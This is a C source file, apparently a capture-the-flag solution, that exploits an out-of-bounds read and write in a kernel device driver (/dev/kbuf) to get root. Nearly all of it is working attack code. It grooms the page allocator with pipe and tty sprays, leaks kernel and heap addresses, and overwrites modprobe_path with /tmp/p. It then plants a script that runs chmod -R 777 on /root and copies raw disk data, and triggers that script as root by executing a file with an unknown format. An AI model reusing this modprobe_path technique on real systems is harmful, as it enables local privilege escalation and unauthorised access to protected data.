#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include<sys/mman.h>
#include<sys/types.h>
#include<signal.h>
#include<sys/syscall.h>
#include<poll.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>



#include<unistd.h>

#define LPE_PATH "/tmp/p\x00"
typedef unsigned long long u64;

int kbuf_fd;


void wait_for_attach() {
    char buf[10];
    printf("waiting..> ");
    gets(buf);
}

int wr(const char *buf, u64 size) {
    return write(kbuf_fd, buf, size);
}


int re(const char *buf, u64 size) {
    return read(kbuf_fd, buf, size);
}

u64 get_val() {
    u64 r = 0;
    re(&r, 8);
    return r;
}

u64 set(u64 offset) {
    return lseek(kbuf_fd, offset, SEEK_SET);
}

u64 bef(u64 offset) {
    return lseek(kbuf_fd, offset, SEEK_CUR);
}

#define errExit(msg)    \
  do {                  \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)


// @smallkirby snipet
#define NUM_IOBUF 0x130
#define PAGE 0x1000UL

char iobufs[PAGE][NUM_IOBUF] = {0};

#define SPRAY_PIPE_NUM 0x80
int pipefds[SPRAY_PIPE_NUM][2];
int ttys[SPRAY_PIPE_NUM];

void spray_tty() {
  puts("[+] Creating tty buffers...");
  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
    ttys[ix] = open("/dev/ptmx", O_NOCTTY|O_RDWR);
    if (ttys[ix] <= 2) errExit("pipe");
  }
}

void spray_pipe() {

  puts("[+] Creating pipe buffers...");
  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
    if (pipe(pipefds[ix]) < 0) errExit("pipe");
  }

  /**
   * pipeに書き込むことでページを確保する。
   * 大量に確保することで、Buddy
   * AllocatorのOrder-1以上のリストからページをSplitしてくる。
   */
  puts("[+] Draining pages from higher order lists...");
  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
    write(pipefds[ix][1], iobufs, 1);
  }

  /**
   * 偶数番目のpipeを閉じることでバッファ(ページ)を解放してBuddy(Order-0)に返却する。
   * NOTE: ここで連続するページを解放してしまうと、
   * 　Buddy AllocatorがページをマージしてOrder-1以上に持っていってしまう。
   */
  puts("[+] Closing even pages...");
  for (int ix = 0; ix < SPRAY_PIPE_NUM; ix += 2) {
    close(pipefds[ix][0]);
    close(pipefds[ix][1]);
  }

}



void pinning_thread(int core) {
}

int kbuf_fds[0x100];

void use(int id) {
    printf("using %d...\n", id);
    kbuf_fd = kbuf_fds[id];
}
u64 target_kbase = 0;
u64 heap_base = 0;
void dump_buf() {
    puts("dump buf");
    for (int j = 0; j < 5; j++) {
        u64 start = 0x1000 * j;
        u64 bef = 0;
        set(start);
        for (int i = 0; i < 0x1000; i += 8) {
            u64 x = get_val();
            u64 y = get_val();
            if (x == y && x == 0) {
                continue;
            }
            if ((x >> 32 == 0xffffffff)) {
                if (i == 2304) {
                    puts("found!");
                    target_kbase = x;
                } else if (target_kbase == 0 && target_kbase % 0x100 == 0x40) {
                    target_kbase = x;
                } else if (target_kbase == 0) {
                    printf("%x %d: %llx %llx\n", j, i, x, y);
                }
            }
            //printf("%x %d: %llx %llx\n", j, i, x, y);
        }
    }
}

int main(void) {
    spray_pipe();
    pinning_thread(0);

    u64 count = 20;

    puts("Oi, nijika");
    for (int idx = 0; idx < count; idx++) {
        kbuf_fds[idx] = open("/dev/kbuf", O_RDWR);
    }
    use(10);
    printf("kbuf fd: %d\n", kbuf_fd);

    char *mark = "nijika ijichi";

    wr(mark, strlen(mark));

    puts("[+] Closing odd pipes...");
    for (int ix = 1; ix < SPRAY_PIPE_NUM; ix += 2) {
        close(pipefds[ix][0]);
        close(pipefds[ix][1]);
    }

    use(10);
    set(512 * 2);
    heap_base = get_val();

    for (int i = 5; i < 10; i++) {
        use(i);
        dump_buf();
    }

    u64 kbase = target_kbase;
    printf("kbase: 0x%llx\n", kbase);
    assert(kbase != 0);
    assert(heap_base != 0);
    printf("heap base: 0x%llx\n", heap_base);

    //u64 mod_probe_path = 0x4713c0 + kbase;
    u64 mod_probe_path = kbase - 0x822c0;
    heap_base -= 0x2800;
    printf("mod_probe_path: 0x%llx\n", mod_probe_path);
    printf("heap base: 0x%llx\n", heap_base);

    use(10);
    u64 base = mod_probe_path - heap_base - 0x4000;
    set(base);
    u64 x = get_val();
    printf("nazo %llx\n", x);

    u64 target_offset = base;
    for (int i = 0; i < 0x10000; i++) {
        if (i % 0x1000 == 0) {
            printf("cur: %llx\n", i);
        }
        set(i * 8 + base);
        u64 x = get_val();
        if (x == 0x6f6d2f6e6962732f) {
            printf("found: %d\n", i);
            target_offset = base + i * 8;
            set(target_offset);
            char buf[20];
            re(buf, 16);
            printf("%s\n", buf);
            break;
        }
    }

    set(target_offset);
    wr(LPE_PATH, strlen(LPE_PATH) + 1);

    wait_for_attach();

    system("echo -ne '#!/bin/sh\n/bin/chmod -R 777 /root\ndd if=/dev/sda of=/tmp/flag.txt bs=1M count=1\n' > /tmp/p; chmod +x /tmp/p");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/neko");
	system("chmod +x /tmp/neko");
	system("/tmp/neko");
	system("cat /root/flag.txt");
}

